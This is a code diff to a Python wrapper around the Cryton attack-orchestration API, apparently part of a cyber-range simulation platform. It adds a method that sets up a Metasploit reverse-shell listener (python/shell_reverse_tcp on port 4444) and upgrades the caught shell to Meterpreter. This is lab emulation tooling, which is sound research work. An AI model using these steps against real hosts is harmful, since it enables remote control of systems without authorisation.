@@ -1,9 +1,10 @@
 import copy
 import yaml
 from dataclasses import dataclass
-from asyncio import sleep
+from asyncio import sleep, run
 import json
 import re
+import uuid
 
 from cyst_platforms.docker_cryton.utility import get_request, post_request
 
@@ -15,6 +16,7 @@ class WorkerMetadata:
     node_id: str
     plan_id: int
     run_id: int
+    plan_execution_id: int
     stage_id: int
     stage_execution_id: int
     update_rules: dict[str, str]
@@ -78,8 +80,9 @@ class Cryton:
     def _get_stage_id(self, plan_id: int) -> int:
         return get_request(f"{self._api_root}stages/?plan_id={plan_id}").json()[0]["id"]
 
-    def _create_run(self, plan_id: int, worker_ids: list[int]) -> int:
-        return post_request(f"{self._api_root}runs/", json={"plan_id": plan_id, "worker_ids": worker_ids}).json()["id"]
+    def _create_run(self, plan_id: int, worker_ids: list[int]) -> tuple[int, list[int]]:
+        r = post_request(f"{self._api_root}runs/", json={"plan_id": plan_id, "worker_ids": worker_ids}).json()
+        return r["id"], r["plan_execution_ids"]
 
     def _execute_run(self, run_id: int):
         if post_request(f"{self._api_root}runs/{run_id}/execute/", data={"run_id": run_id}).status_code != 200:
@@ -108,6 +111,13 @@ class Cryton:
 
     def _get_run_report(self, run_id: int) -> dict:
         return get_request(f"{self._api_root}runs/{run_id}/report/").json()
+
+    def _set_ex_vars(self, plan_ex_id: int, ex_vars: dict) -> None:
+        post_request(
+            f"{self._api_root}execution_variables/",
+            data={"plan_execution_id": plan_ex_id},
+            files={"file": json.dumps(ex_vars)},
+        )
 
     @staticmethod
     def _add_update_rules_to_template(step_template: dict, update_rules: dict) -> None:
@@ -144,7 +154,7 @@ class Cryton:
         template_id = self._create_template(template)
         plan_id = self._create_plan(template_id)
         stage_id = self._get_stage_id(plan_id)
-        run_id = self._create_run(plan_id, [worker_id])
+        run_id, plan_ex_ids = self._create_run(plan_id, [worker_id])
         stage_execution_id = self._get_run_report(run_id)["detail"]["plan_executions"][0]["stage_executions"][0]["id"]
         self._execute_run(run_id)
 
@@ -154,11 +164,43 @@ class Cryton:
             node_id,
             plan_id,
             run_id,
+            plan_ex_ids[0],
             stage_id,
             stage_execution_id,
             dict(reversed(sorted(output_update_rules.items(), key=lambda item: len(item[1])))),
         )
         print("OK")
+
+    def create_session(self, node_id, session_id: str):
+        print(f"Creating session {session_id} on node {node_id}")
+        step_ex_id = self.execute_action({
+            f"session-listener-{uuid.uuid4()}": {
+                "module": "metasploit",
+                "arguments": {
+                    "module_name": "multi/handler",
+                    "datastore": {"payload": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444},
+                },
+            }
+        }, node_id)
+        report = run(self.wait_for_action_result(step_ex_id))
+        sess_id = report["serialized_output"]["session_id"]
+
+        step_ex_id = self.execute_action({
+            f"upgrade-session-{uuid.uuid4()}": {
+                "module": "metasploit",
+                "arguments": {
+                    "module_name": "multi/manage/shell_to_meterpreter",
+                    "datastore": {
+                        "LHOST": node_id,
+                        "SESSION": sess_id,
+                    },
+                },
+            }
+        }, node_id)
+        report = run(self.wait_for_action_result(step_ex_id))
+        sess_id = report["serialized_output"]["session_id"]
+        self._set_ex_vars(self._workers[node_id].plan_execution_id, {session_id: sess_id})
+        print(f"Session {session_id} on node {node_id} created.")
 
     def execute_action(self, step_template: dict, node_id: str) -> int:
         worker_metadata = self._workers[node_id]
